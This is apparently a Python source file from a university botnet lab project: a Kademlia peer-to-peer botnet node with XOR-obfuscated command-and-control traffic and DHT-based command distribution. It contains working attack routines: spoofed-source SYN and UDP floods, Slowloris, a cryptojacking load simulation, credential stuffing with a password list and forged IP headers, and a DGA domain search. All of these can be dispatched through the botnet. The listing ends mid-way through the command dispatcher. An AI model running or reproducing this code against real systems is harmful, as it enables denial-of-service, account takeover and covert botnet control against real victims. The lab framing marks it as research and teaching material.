"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Phase 3 - Kademlia P2P DHT Botnet Node (Python)
 FULLY SPEC-COMPLIANT
 ISOLATED VM LAB ONLY

 New over previous version:
   + Replacement cache (paper): bucket full + oldest alive -> newcomer
     queued in replacement_cache (REPLACEMENT_FACTOR*k max); promoted
     on contact removal (jontab kad_bucket_remove_contact pattern)
   + Per-bucket last_touched (jontab): stale_buckets() + lazy refresh
   + Value TTL expiry (paper): entries expire after VALUE_TTL seconds;
     _expiry_loop purges; FIND_VALUE treats expired as miss
   + Original-publisher republishing (paper §2.5): _republish_loop
     re-pushes every REPUBLISH_INTERVAL (23 h)
   + k-closest confirmation round (paper §2.3): final pass in
     iterative_find_node queries any unqueried k-closest
   + Lookup-path caching (paper §2.5): FIND_VALUE caches at closest
     non-holding path node with distance-weighted TTL
   + Client/server mode (libp2p): --client flag; client contacts
     excluded from routing tables
   + ADD_PROVIDER / GET_PROVIDERS / PROVIDER_PEERS (libp2p 0x0A-0x0C)
   + Entry validation: Validator.validate + Validator.select applied
     on all STORE/FIND_VALUE operations
   + Quorum-based FIND_VALUE: collect QUORUM responses before returning
   + Periodic re-bootstrap (libp2p): every BOOTSTRAP_INTERVAL (10 min)
====================================================
"""

import os, sys, time, json, random, signal, socket, struct
import hashlib, threading, collections
from datetime import datetime
from typing import Optional, List, Tuple, Dict, Set

K                  = 8
ALPHA              = 3
QUORUM             = 3
ID_BITS            = 160
BUCKET_COUNT       = ID_BITS
CONTACT_SIZE       = 26
HDR_SIZE           = 35
PING_TIMEOUT       = 2.0
FIND_TIMEOUT       = 3.0
REFRESH_INTERVAL   = 300
BUCKET_TTL         = 3600
REPLICATE_INTERVAL = 3600
STATUS_INTERVAL    = 60
POLL_INTERVAL      = 30
EXEC_HISTORY       = 256
VALUE_TTL          = 86400
REPUBLISH_INTERVAL = 82800
BOOTSTRAP_INTERVAL = 600
EXPIRY_CHECK_SEC   = 3600
REPLACEMENT_FACTOR = 5

P2P_SECRET = b"AUA_P2P_MESH_KEY"

class MSG:
    PING           = 0x01
    PONG           = 0x02
    FIND_NODE      = 0x03
    FOUND_NODES    = 0x04
    STORE          = 0x05
    FIND_VALUE     = 0x06
    FOUND_VALUE    = 0x07
    STOP_ALL       = 0x08
    SHUTDOWN       = 0x09
    ADD_PROVIDER   = 0x0A
    GET_PROVIDERS  = 0x0B
    PROVIDER_PEERS = 0x0C

_KEY_HASH      = hashlib.sha256(P2P_SECRET).digest()
_KEY_HASH_LOCK = threading.Lock()

def xor_cipher(data: bytes) -> bytes:
    with _KEY_HASH_LOCK:
        kh = _KEY_HASH
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ kh[i % len(kh)]
    return bytes(out)

class Validator:
    def validate(self, key: str, value: str) -> bool:
        return True
    def select(self, key: str, values: List[str]) -> int:
        return 0

class NodeID:
    __slots__ = ("value",)
    def __init__(self, value: int):
        assert 0 <= value < (1 << ID_BITS)
        self.value = value
    @classmethod
    def from_bytes(cls, b: bytes) -> "NodeID":
        return cls(int.from_bytes(b[:20], "big"))
    @classmethod
    def from_host_port(cls, host: str, port: int) -> "NodeID":
        return cls.from_bytes(hashlib.sha1(f"{host}:{port}".encode()).digest())
    @classmethod
    def random(cls) -> "NodeID":
        return cls(random.getrandbits(ID_BITS))
    def to_bytes(self) -> bytes:
        return self.value.to_bytes(20, "big")
    def distance(self, other: "NodeID") -> int:
        return self.value ^ other.value
    def bucket_index(self, other: "NodeID") -> int:
        d = self.distance(other)
        return -1 if d == 0 else d.bit_length() - 1
    def to_hex(self) -> str:
        return f"{self.value:040x}"
    def __eq__(self, o): return isinstance(o, NodeID) and self.value == o.value
    def __hash__(self): return hash(self.value)
    def __repr__(self): return f"NodeID({self.to_hex()[:12]}...)"

class Contact:
    __slots__ = ("node_id","host","port","last_seen","fail_count","server_mode")
    def __init__(self, node_id: NodeID, host: str, port: int, server_mode: bool = True):
        self.node_id     = node_id
        self.host        = host
        self.port        = port
        self.last_seen   = time.time()
        self.fail_count  = 0
        self.server_mode = server_mode
    def to_wire(self) -> bytes:
        return self.node_id.to_bytes() + socket.inet_aton(self.host) + struct.pack("!H", self.port)
    @classmethod
    def from_wire(cls, data: bytes, offset: int = 0) -> Tuple["Contact", int]:
        if offset + CONTACT_SIZE > len(data): raise ValueError("Truncated")
        nid  = NodeID.from_bytes(data[offset:offset+20])
        host = socket.inet_ntoa(data[offset+20:offset+24])
        port = struct.unpack("!H", data[offset+24:offset+26])[0]
        return cls(nid, host, port), offset + CONTACT_SIZE
    def __eq__(self, o): return isinstance(o, Contact) and self.node_id == o.node_id
    def __hash__(self): return hash(self.node_id)
    def __repr__(self):
        m = "" if self.server_mode else "[C]"
        return f"Contact({self.node_id.to_hex()[:8]}@{self.host}:{self.port}{m})"

def build_msg(msg_type: int, sc: Contact, msg_id: bytes = None, payload: bytes = b"") -> bytes:
    if msg_id is None: msg_id = os.urandom(8)
    hdr = (struct.pack("!B", msg_type) + msg_id + sc.node_id.to_bytes() +
           socket.inet_aton(sc.host) + struct.pack("!H", sc.port))
    return xor_cipher(hdr + payload)

def parse_msg(data: bytes) -> Optional[dict]:
    if len(data) < HDR_SIZE: return None
    try:
        d = xor_cipher(data)
        return {"type":    d[0],
                "msg_id":  d[1:9],
                "sender":  Contact(NodeID.from_bytes(d[9:29]),
                                   socket.inet_ntoa(d[29:33]),
                                   struct.unpack("!H", d[33:35])[0]),
                "payload": d[35:]}
    except Exception:
        return None

def _parse_contacts(payload: bytes) -> List[Contact]:
    if not payload: return []
    count = payload[0]; result = []; offset = 1
    for _ in range(count):
        try:
            c, offset = Contact.from_wire(payload, offset); result.append(c)
        except Exception: break
    return result

class KBucket:
    def __init__(self, k: int = K):
        self.k                 = k
        self.contacts          = collections.OrderedDict()
        self.replacement_cache = collections.OrderedDict()
        self.lock              = threading.Lock()
        self.last_touched      = time.time()

    def add(self, contact: Contact, ping_fn=None) -> bool:
        with self.lock:
            key = contact.node_id.value
            if key in self.contacts:
                self.contacts.move_to_end(key)
                self.contacts[key].last_seen  = time.time()
                self.contacts[key].fail_count = 0
                self.last_touched = time.time()
                return True
            if key in self.replacement_cache:
                self.replacement_cache.move_to_end(key)
                self.replacement_cache[key].last_seen = time.time()
                return False
            if len(self.contacts) < self.k:
                self.contacts[key] = contact
                self.last_touched  = time.time()
                return True
            oldest_key     = next(iter(self.contacts))
            oldest_contact = self.contacts[oldest_key]
            alive = ping_fn(oldest_contact) if ping_fn else False
            if alive:
                self.contacts.move_to_end(oldest_key)
                self.contacts[oldest_key].last_seen = time.time()
                self.replacement_cache.pop(key, None)
                self.replacement_cache[key] = contact
                while len(self.replacement_cache) > REPLACEMENT_FACTOR * self.k:
                    self.replacement_cache.popitem(last=False)
                return False
            else:
                del self.contacts[oldest_key]
                self.contacts[key] = contact
                self.last_touched  = time.time()
                return True

    def remove(self, node_id: NodeID):
        with self.lock:
            key = node_id.value
            if key in self.contacts:
                del self.contacts[key]
                if self.replacement_cache:
                    pk, promoted = self.replacement_cache.popitem(last=True)
                    self.contacts[pk] = promoted
                    self.last_touched = time.time()

    def get_all(self) -> List[Contact]:
        with self.lock: return list(self.contacts.values())
    def is_stale(self) -> bool: return (time.time() - self.last_touched) > BUCKET_TTL
    def touch(self):
        with self.lock: self.last_touched = time.time()
    def __len__(self):
        with self.lock: return len(self.contacts)

class RoutingTable:
    def __init__(self, self_id: NodeID, k: int = K):
        self.self_id = self_id
        self.k       = k
        self.buckets = [KBucket(k) for _ in range(BUCKET_COUNT)]

    def add(self, contact: Contact, ping_fn=None) -> bool:
        if contact.node_id == self.self_id: return False
        if not contact.server_mode: return False
        idx = self.self_id.bucket_index(contact.node_id)
        if idx < 0 or idx >= BUCKET_COUNT: return False
        result = self.buckets[idx].add(contact, ping_fn)
        if result: self.buckets[idx].touch()
        return result

    def remove(self, node_id: NodeID):
        idx = self.self_id.bucket_index(node_id)
        if 0 <= idx < BUCKET_COUNT: self.buckets[idx].remove(node_id)

    def find_closest(self, target_id: NodeID, n: int = K) -> List[Contact]:
        candidates = []
        for b in self.buckets: candidates.extend(b.get_all())
        candidates.sort(key=lambda c: c.node_id.distance(target_id))
        return candidates[:n]

    def all_contacts(self) -> List[Contact]:
        result = []
        for b in self.buckets: result.extend(b.get_all())
        return result

    def stale_buckets(self) -> List[Tuple[int, KBucket]]:
        return [(i, b) for i, b in enumerate(self.buckets) if len(b) > 0 and b.is_stale()]

    def bucket_stats(self) -> List[int]:
        return [len(b) for b in self.buckets if len(b) > 0]

class _ProviderStore:
    def __init__(self):
        self._d    : Dict[str, Set[Contact]] = {}
        self._lock = threading.Lock()
    def add(self, key_hex: str, contact: Contact):
        with self._lock:
            if key_hex not in self._d: self._d[key_hex] = set()
            self._d[key_hex].discard(contact)
            self._d[key_hex].add(contact)
    def get(self, key_hex: str) -> List[Contact]:
        with self._lock: return list(self._d.get(key_hex, set()))

# ── attack helpers ─────────────────────────────────────────────────────────

def _attack_syn_flood(target, port, duration, stop):
    try:
        from scapy.all import IP, TCP, send, conf; conf.verb = 0
    except ImportError:
        print("[P2P] Scapy not installed"); return
    print(f"[ATTACK] SYN FLOOD -> {target}:{port}  dur={duration}s")
    end = time.time() + duration; count = 0
    while time.time() < end and not stop.is_set():
        src = ".".join(str(random.randint(10,230)) for _ in range(4))
        pkt = (IP(src=src,dst=target)/TCP(sport=random.randint(1024,65535),
               dport=port,flags="S",seq=random.randint(0,2**32-1)))
        send(pkt,verbose=False); count+=1
    print(f"[ATTACK] SYN FLOOD done. Packets: {count}")

def _attack_udp_flood(target, duration, stop):
    try:
        from scapy.all import IP, UDP, Raw, send, conf; conf.verb = 0
    except ImportError:
        print("[P2P] Scapy not installed"); return
    print(f"[ATTACK] UDP FLOOD -> {target}  dur={duration}s")
    payload = b"\x00"*1024; end = time.time()+duration; count = 0
    while time.time() < end and not stop.is_set():
        src = ".".join(str(random.randint(10,230)) for _ in range(4))
        pkt = (IP(src=src,dst=target)/UDP(sport=random.randint(1024,65535),
               dport=random.randint(1,65534))/Raw(load=payload))
        send(pkt,verbose=False); count+=1
    print(f"[ATTACK] UDP FLOOD done. Packets: {count}")

def _attack_slowloris(target, port, duration, stop):
    print(f"[ATTACK] SLOWLORIS -> {target}:{port}  dur={duration}s")
    socks = []
    for _ in range(150):
        if stop.is_set(): break
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(4); s.connect((target,port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
            socks.append(s)
        except Exception: pass
    end = time.time()+duration
    while time.time()<end and not stop.is_set():
        dead=[]
        for s in list(socks):
            try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception: dead.append(s)
        for s in dead:
            socks.remove(s)
            try: s.close()
            except Exception: pass
        while len(socks)<150 and not stop.is_set():
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(4); s.connect((target,port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
                socks.append(s)
            except Exception: break
        stop.wait(10)
    for s in socks:
        try: s.close()
        except Exception: pass
    print("[ATTACK] SLOWLORIS done.")

def _attack_cryptojack(duration, cpu, stop):
    print(f"[ATTACK] CRYPTOJACK  cpu={cpu*100:.0f}%  dur={duration}s")
    state=os.urandom(32); end=time.time()+duration
    while time.time()<end and not stop.is_set():
        te=time.perf_counter()+cpu*0.1
        while time.perf_counter()<te: state=hashlib.sha256(state).digest()
        time.sleep((1.0-cpu)*0.1)
    print("[ATTACK] CRYPTOJACK done.")

def _attack_cred_stuffing(target, port, duration, mode, jitter_ms, n_workers, stop):
    CREDS = [
        ("alice@example.com","password123"),("bob@example.com","123456"),
        ("admin@example.com","admin"),("admin@example.com","admin123"),
        ("admin@example.com","password"),("admin@example.com","securePass123!"),
        ("root@server.com","root"),("root@server.com","toor"),
        ("user@example.com","user"),("user@example.com","password1"),
        ("test@test.com","test"),("support@app.com","support"),
        ("guest@example.com","guest"),("pi@raspberry.com","raspberry"),
        ("admin@example.com","1234"),("charlie@corp.com","charlie2024"),
        ("dave@mail.com","monkey"),("eve@email.com","sunshine"),
        ("frank@net.com","dragon"),("grace@web.io","batman"),
        ("john.doe@corp.com","John2024"),("info@company.com","info2024"),
        ("admin@example.com","letmein"),("bob@example.com","iloveyou"),
        ("alice@example.com","qwerty"),("root@server.com","123456"),
        ("user@example.com","user"),("test@test.com","test123"),
        ("admin@example.com","pass"),("support@app.com","support123"),
    ]
    import urllib.request,urllib.parse,urllib.error
    url=f"http://{target}:{port}/login"
    def _post(em,pw,hdrs=None):
        body=urllib.parse.urlencode({"email":em,"password":pw}).encode()
        h={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}
        if hdrs: h.update(hdrs)
        req=urllib.request.Request(url,data=body,headers=h)
        try:
            with urllib.request.urlopen(req,timeout=5) as r: return r.status
        except urllib.error.HTTPError as e: return e.code
        except Exception: return 0
    def _sl(base,jitter):
        delta=random.uniform(-jitter,jitter) if mode!="bot" else 0
        time.sleep(max(50,base+delta)/1000.0)
    hits=[]; lock=threading.Lock()
    print(f"[ATTACK] CRED STUFFING -> {url}  mode={mode}")
    if mode=="distributed":
        chunk=max(1,len(CREDS)//max(1,n_workers))
        def _w(cc,wid):
            fip=f"10.{random.randint(0,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
            hd={"X-Forwarded-For":fip,"X-Real-IP":fip}
            et=time.time()+duration
            for em,pw in cc:
                if stop.is_set() or time.time()>et: break
                if _post(em,pw,hd)==200:
                    with lock: hits.append((em,pw))
                    print(f"[ATTACK-{wid}] HIT: {em}:{pw}")
                _sl(500//max(1,n_workers),jitter_ms)
        ts=[threading.Thread(target=_w,args=(CREDS[i*chunk:(i+1)*chunk],i),daemon=True)
            for i in range(n_workers)]
        for t in ts: t.start()
        et=time.time()+duration
        while time.time()<et and not stop.is_set(): time.sleep(0.5)
        stop.set()
        for t in ts: t.join(timeout=3)
    else:
        et=time.time()+duration
        while time.time()<et and not stop.is_set():
            for em,pw in CREDS:
                if stop.is_set() or time.time()>et: break
                if _post(em,pw)==200:
                    with lock: hits.append((em,pw))
                    print(f"[ATTACK] HIT: {em}:{pw}")
                _sl(500,jitter_ms)
    print(f"[ATTACK] CRED STUFFING done. hits={len(hits)}"+(f"  valid={hits}" if hits else ""))

def _attack_dga_search(stop):
    print("[ATTACK] DGA SEARCH started")
    try:
        from dga import generate_daily_domains
        for dom in generate_daily_domains(count=20)[:15]:
            if stop.is_set(): return
            try:
                ip=socket.gethostbyname(dom)
                print(f"[ATTACK] DGA rendezvous: {dom} -> {ip}"); break
            except socket.gaierror:
                print(f"[ATTACK] NXDOMAIN: {dom}"); time.sleep(0.3)
        print("[ATTACK] DGA SEARCH done."); return
    except ImportError: pass
    try:
        import subprocess
        proc=subprocess.Popen(["python3","dga.py"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        for _ in range(30):
            if stop.is_set() or proc.poll() is not None: break
            time.sleep(1)
        if proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=3)
            except subprocess.TimeoutExpired: proc.kill()
    except Exception as e:
        print(f"[ATTACK] DGA subprocess failed: {e}")
    print("[ATTACK] DGA SEARCH done.")

# ── Kademlia Node ──────────────────────────────────────────────────────────

class KademliaNode:
    COMMAND_KEY = hashlib.sha1(b"botnet_command_v1").hexdigest()

    def __init__(self, host: str, port: int,
                 bootstrap_peers: List[Tuple[str,int]] = None,
                 server_mode: bool = True,
                 validator: Validator = None):
        self.host        = host
        self.port        = port
        self.server_mode = server_mode
        self.node_id     = NodeID.from_host_port(host, port)
        self.contact     = Contact(self.node_id, host, port, server_mode=server_mode)
        self.routing     = RoutingTable(self.node_id)
        self.validator   = validator or Validator()
        self._pstore     = _ProviderStore()
        self.store       : dict = {}
        self.store_lock  = threading.Lock()
        self._orig_keys      : Set[str] = set()
        self._orig_keys_lock = threading.Lock()
        self._sock       = None
        self._running    = False
        self._pending    : dict = {}
        self._responses  : dict = {}
        self._rpc_lock   = threading.Lock()
        self.bootstrap_peers = bootstrap_peers or []
        self._exec_ring  = [None]*EXEC_HISTORY
        self._exec_count = 0
        self._exec_lock  = threading.Lock()
        self._active     : dict = {}
        self._active_lock = threading.Lock()
        print(f"[P2P] Node ID: {self.node_id.to_hex()[:16]}...  mode={'server' if server_mode else 'client'}")
        print(f"[P2P] Listening on {host}:{port}")

    # transport

    def _bind(self):
        self._sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.host,self.port))

    def _send_raw(self, data: bytes, host: str, port: int):
        try: self._sock.sendto(data,(host,port))
        except Exception: pass

    def _send_rpc(self, msg_type: int, host: str, port: int,
                  timeout: float = FIND_TIMEOUT, payload: bytes = b"") -> Optional[dict]:
        msg_id = os.urandom(8)
        evt    = threading.Event()
        with self._rpc_lock: self._pending[msg_id] = evt
        self._send_raw(build_msg(msg_type,self.contact,msg_id=msg_id,payload=payload),host,port)
        evt.wait(timeout)
        with self._rpc_lock:
            self._pending.pop(msg_id,None)
            return self._responses.pop(msg_id,None)

    # receive loop

    def _recv_loop(self):
        while self._running:
            try: data,_ = self._sock.recvfrom(65535)
            except socket.timeout: continue
            except Exception: break
            msg = parse_msg(data)
            if not msg: continue
            try: self.routing.add(msg["sender"],ping_fn=self._ping_contact)
            except Exception: pass
            with self._rpc_lock:
                mid = msg["msg_id"]
                if mid in self._pending:
                    self._responses[mid] = msg
                    self._pending[mid].set()
                    continue
            self._handle_incoming(msg)

    # incoming handler

    def _handle_incoming(self, msg: dict):
        mt      = msg["type"]
        sender  = msg["sender"]
        mid     = msg["msg_id"]
        payload = msg["payload"]

        if mt == MSG.PING:
            self._send_raw(build_msg(MSG.PONG,self.contact,msg_id=mid),sender.host,sender.port)

        elif mt == MSG.FIND_NODE and len(payload) >= 20:
            tid     = NodeID.from_bytes(payload[:20])
            closest = self.routing.find_closest(tid,K)
            wire    = b"".join(c.to_wire() for c in closest)
            pl      = struct.pack("!B",len(closest))+wire
            self._send_raw(build_msg(MSG.FOUND_NODES,self.contact,msg_id=mid,payload=pl),sender.host,sender.port)

        elif mt == MSG.STORE and len(payload) >= 22:
            key_hex = payload[:20].hex()
            vlen    = struct.unpack("!H",payload[20:22])[0]
            value   = payload[22:22+vlen].decode("utf-8",errors="replace")
            if self.validator.validate(key_hex,value):
                with self.store_lock:
                    existing = self.store.get(key_hex)
                    if existing and (time.time()-existing["ts"])<existing.get("ttl",VALUE_TTL):
                        try:
                            idx  = self.validator.select(key_hex,[existing["value"],value])
                            best = [existing["value"],value][idx]
                        except Exception: best = value
                    else:
                        best = value
                    self.store[key_hex] = {"value":best,"ts":time.time(),"ttl":VALUE_TTL,"is_original":False}
            self._send_raw(build_msg(MSG.PONG,self.contact,msg_id=mid),sender.host,sender.port)

        elif mt == MSG.FIND_VALUE and len(payload) >= 20:
            key_hex = payload[:20].hex()
            with self.store_lock: entry = self.store.get(key_hex)
            if entry and (time.time()-entry["ts"])<entry.get("ttl",VALUE_TTL):
                vb = entry["value"].encode("utf-8")
                pl = payload[:20]+struct.pack("!H",len(vb))+vb
                self._send_raw(build_msg(MSG.FOUND_VALUE,self.contact,msg_id=mid,payload=pl),sender.host,sender.port)
            else:
                if entry:
                    with self.store_lock: self.store.pop(key_hex,None)
                tid     = NodeID.from_bytes(payload[:20])
                closest = self.routing.find_closest(tid,K)
                wire    = b"".join(c.to_wire() for c in closest)
                pl      = struct.pack("!B",len(closest))+wire
                self._send_raw(build_msg(MSG.FOUND_NODES,self.contact,msg_id=mid,payload=pl),sender.host,sender.port)

        elif mt == MSG.ADD_PROVIDER and len(payload) >= 20:
            self._pstore.add(payload[:20].hex(),sender)
            self._send_raw(build_msg(MSG.PONG,self.contact,msg_id=mid),sender.host,sender.port)

        elif mt == MSG.GET_PROVIDERS and len(payload) >= 20:
            key_hex   = payload[:20].hex()
            providers = self._pstore.get(key_hex)[:K]
            tid       = NodeID.from_bytes(payload[:20])
            closer    = self.routing.find_closest(tid,K)
            pw        = b"".join(p.to_wire() for p in providers)
            cw        = b"".join(c.to_wire() for c in closer)
            pl        = struct.pack("!B",len(providers))+pw+struct.pack("!B",len(closer))+cw
            self._send_raw(build_msg(MSG.PROVIDER_PEERS,self.contact,msg_id=mid,payload=pl),sender.host,sender.port)

        elif mt == MSG.STOP_ALL:
            print("[P2P] STOP_ALL received"); self._stop_all_attacks()

        elif mt == MSG.SHUTDOWN:
            print("[P2P] SHUTDOWN received"); self._stop_all_attacks(); self._running=False

    # RPC wrappers

    def _ping_contact(self, c: Contact) -> bool:
        r = self._send_rpc(MSG.PING,c.host,c.port,timeout=PING_TIMEOUT)
        return r is not None and r["type"]==MSG.PONG

    def _find_node_rpc(self, c: Contact, tid: NodeID) -> List[Contact]:
        r = self._send_rpc(MSG.FIND_NODE,c.host,c.port,payload=tid.to_bytes())
        if not r or r["type"]!=MSG.FOUND_NODES: return []
        return _parse_contacts(r["payload"])

    def _find_value_rpc(self, c: Contact, key: str) -> Tuple[Optional[str],List[Contact]]:
        r = self._send_rpc(MSG.FIND_VALUE,c.host,c.port,payload=bytes.fromhex(key))
        if not r: return None,[]
        if r["type"]==MSG.FOUND_VALUE:
            p = r["payload"]
            if len(p)>=22:
                vlen  = struct.unpack("!H",p[20:22])[0]
                value = p[22:22+vlen].decode("utf-8",errors="replace")
                if self.validator.validate(key,value): return value,[]
            return None,[]
        if r["type"]==MSG.FOUND_NODES:
            return None,_parse_contacts(r["payload"])
        return None,[]

    def _store_rpc(self, c: Contact, key: str, value: str) -> bool:
        kb = bytes.fromhex(key); vb = value.encode("utf-8")
        pl = kb+struct.pack("!H",len(vb))+vb
        return self._send_rpc(MSG.STORE,c.host,c.port,payload=pl) is not None

    # iterative lookups

    def iterative_find_node(self, target_id: NodeID) -> List[Contact]:
        closest = self.routing.find_closest(target_id,K)
        if not closest: return []
        closest.sort(key=lambda c: c.node_id.distance(target_id))
        queried: set = set()

        for _ in range(20):
            to_q = [c for c in closest if c.node_id.value not in queried][:ALPHA]
            if not to_q: break
            new_contacts: List[Contact] = []; lock = threading.Lock()
            def _q(c: Contact, _nc=new_contacts, _lock=lock):
                queried.add(c.node_id.value)
                ret = self._find_node_rpc(c,target_id)
                with _lock: _nc.extend(ret)
                for nc in ret: self.routing.add(nc,ping_fn=self._ping_contact)
            ts = [threading.Thread(target=_q,args=(c,),daemon=True) for c in to_q]
            for t in ts: t.start()
            for t in ts: t.join(timeout=FIND_TIMEOUT+1)
            if not new_contacts: break
            for nc in new_contacts:
                if nc.node_id!=self.node_id and nc not in closest: closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        # k-closest confirmation round (paper §2.3)
        unqueried = [c for c in closest[:K] if c.node_id.value not in queried]
        if unqueried:
            extra: List[Contact] = []; lock = threading.Lock()
            def _cfm(c: Contact, _nc=extra, _lock=lock):
                queried.add(c.node_id.value)
                ret = self._find_node_rpc(c,target_id)
                with _lock: _nc.extend(ret)
            ts = [threading.Thread(target=_cfm,args=(c,),daemon=True) for c in unqueried]
            for t in ts: t.start()
            for t in ts: t.join(timeout=FIND_TIMEOUT+1)
            for nc in extra:
                if nc.node_id!=self.node_id and nc not in closest: closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        return closest

    def iterative_find_value(self, key: str, quorum: int = QUORUM) -> Optional[str]:
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(),16))
        closest   = self.routing.find_closest(target_id,K)
        if not closest: return None
        closest.sort(key=lambda c: c.node_id.distance(target_id))
        queried: set = set()
        collected   : List[Tuple[str,Contact]] = []
        non_holders : List[Contact]             = []
        lock = threading.Lock()

        for _ in range(20):
            to_q = [c for c in closest if c.node_id.value not in queried][:ALPHA]
            if not to_q: break
            def _q(c: Contact, _col=collected, _nh=non_holders, _lock=lock):
                queried.add(c.node_id.value)
                val,closer = self._find_value_rpc(c,key)
                with _lock:
                    if val is not None: _col.append((val,c))
                    else:
                        _nh.append(c)
                        for nc in closer:
                            self.routing.add(nc,ping_fn=self._ping_contact)
                            if nc not in closest: closest.append(nc)
            ts = [threading.Thread(target=_q,args=(c,),daemon=True) for c in to_q]
            for t in ts: t.start()
            for t in ts: t.join(timeout=FIND_TIMEOUT+1)
            if len(collected)>=quorum: break
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        if not collected: return None

        # Conflict resolution via Validator.select
        all_vals = [v for v,_ in collected]
        try:
            idx = self.validator.select(key,all_vals)
            best = all_vals[idx if 0<=idx<len(all_vals) else 0]
        except Exception:
            best = all_vals[0]

        # Entry correction: STORE best value at non-holding nodes
        correction = [c for v,c in collected if v!=best]+non_holders
        for c in correction[:K]:
            threading.Thread(target=self._store_rpc,args=(c,key,best),daemon=True).start()

        # Lookup-path caching: cache at closest non-holding path node (paper §2.5)
        if non_holders:
            non_holders.sort(key=lambda c: c.node_id.distance(target_id))
            threading.Thread(target=self._store_rpc,args=(non_holders[0],key,best),daemon=True).start()

        return best

    def store_value(self, key: str, value: str, is_original: bool = False) -> int:
        if not self.validator.validate(key,value):
            print(f"[DHT] store_value: validator rejected {key[:12]}"); return 0
        with self.store_lock:
            self.store[key] = {"value":value,"ts":time.time(),"ttl":VALUE_TTL,"is_original":is_original}
        if is_original:
            with self._orig_keys_lock: self._orig_keys.add(key)
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(),16))
        closest   = self.iterative_find_node(target_id)
        return sum(1 for c in closest[:K] if self._store_rpc(c,key,value))

    def add_provider(self, key_bytes: bytes) -> int:
        """Announce self as provider for key_bytes on K closest nodes."""
        target_id = NodeID.from_bytes(key_bytes)
        closest   = self.iterative_find_node(target_id)
        acks = 0
        for c in closest[:K]:
            if self._send_rpc(MSG.ADD_PROVIDER,c.host,c.port,payload=key_bytes) is not None:
                acks+=1
        print(f"[DHT] add_provider: announced on {acks}/{len(closest)} nodes")
        return acks

    def get_providers(self, key_bytes: bytes) -> List[Contact]:
        """Find peers that have announced themselves as providers for key_bytes."""
        target_id = NodeID.from_bytes(key_bytes)
        closest   = self.routing.find_closest(target_id,K)
        if not closest: return []
        closest.sort(key=lambda c: c.node_id.distance(target_id))
        providers: List[Contact] = []; queried: set = set()
        for _ in range(20):
            to_q = [c for c in closest if c.node_id.value not in queried][:ALPHA]
            if not to_q or providers: break
            for c in to_q:
                queried.add(c.node_id.value)
                r = self._send_rpc(MSG.GET_PROVIDERS,c.host,c.port,payload=key_bytes)
                if not r or r["type"]!=MSG.PROVIDER_PEERS: continue
                p = r["payload"]; offset = 0
                if not p: continue
                pcount = p[offset]; offset+=1
                for _ in range(pcount):
                    try:
                        pc,offset = Contact.from_wire(p,offset)
                        if pc not in providers: providers.append(pc)
                    except Exception: break
                if providers: break
                if offset < len(p):
                    ccount = p[offset]; offset+=1
                    for _ in range(ccount):
                        try:
                            nc,offset = Contact.from_wire(p,offset)
                            if nc not in closest: closest.append(nc)
                        except Exception: break
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]
        print(f"[DHT] get_providers: found {len(providers)} providers")
        return providers

    # bootstrap

    def bootstrap(self):
        print(f"[P2P] Bootstrapping from {len(self.bootstrap_peers)} seed(s)...")
        for host,port in self.bootstrap_peers:
            seed = Contact(NodeID.from_host_port(host,port),host,port)
            if self._ping_contact(seed):
                self.routing.add(seed)
                print(f"[P2P] Seed reachable: {host}:{port}")
            else:
                print(f"[P2P] Seed unreachable: {host}:{port}")
        self.iterative_find_node(self.node_id)
        print(f"[P2P] Routing table populated: {len(self.routing.all_contacts())} peers")

    # command handling

    def _dedup_seen(self, value: str) -> bool:
        h = hashlib.sha1(value.encode()).hexdigest()
        with self._exec_lock:
            count = min(self._exec_count,EXEC_HISTORY)
            for i in range(count):
                if self._exec_ring[(self._exec_count-1-i)%EXEC_HISTORY]==h: return True
            self._exec_ring[self._exec_count%EXEC_HISTORY]=h
            self._exec_count+=1
        return False

    def _poll_for_commands(self):
        value = self.iterative_find_value(self.COMMAND_KEY)
        if not value or self._dedup_seen(value): return
        try: cmd = json.loads(value)
        except Exception: return
        print(f"\n[P2P] *** COMMAND RECEIVED from DHT ***")
        print(f"[P2P] Type: {cmd.get('type')}  Payload: {value[:120]}")
        self._execute_command(cmd)

    def inject_command(self, cmd: dict) -> int:
        value = json.dumps(cmd)
        acks  = self.store_value(self.COMMAND_KEY,value,is_original=True)
        print(f"[P2P] Command injected: {cmd.get('type')} -> stored on {acks} nodes")
        return acks

    def _launch(self, cmd_type: str, fn, *args):
        with self._active_lock:
            if cmd_type in self._active:
                _,old_stop = self._active.pop(cmd_type); old_stop.set()
            stop = threading.Event()
            t    = threading.Thread(target=fn,args=(*args,stop),daemon=True,name=f"p2p-{cmd_type}")
            t.start()
            self._active[cmd_type] = (t,stop)
        print(f"[ATTACK] Launched: {cmd_type}")

    def _stop_all_attacks(self):
        with self._active_lock:
            for _,(_, ev) in self._active.items(): ev.set()
            self._active.clear()
        print("[ATTACK] All attacks stopped.")

    def _execute_command(self, cmd: dict):
        ct = cmd.get("type","idle")
        if   ct=="syn_flood":
            self._launch("syn_flood",_attack_syn_flood,cmd.get("target","192.168.100.20"),
                         int(cmd.get("port",80)),int(cmd.get("duration",30)))
        elif ct=="udp_flood":
            self._launch("udp_flood",_attack_udp_flood,cmd.get("target","192.168.100.20"),
                         int(cmd.get("duration",30)))
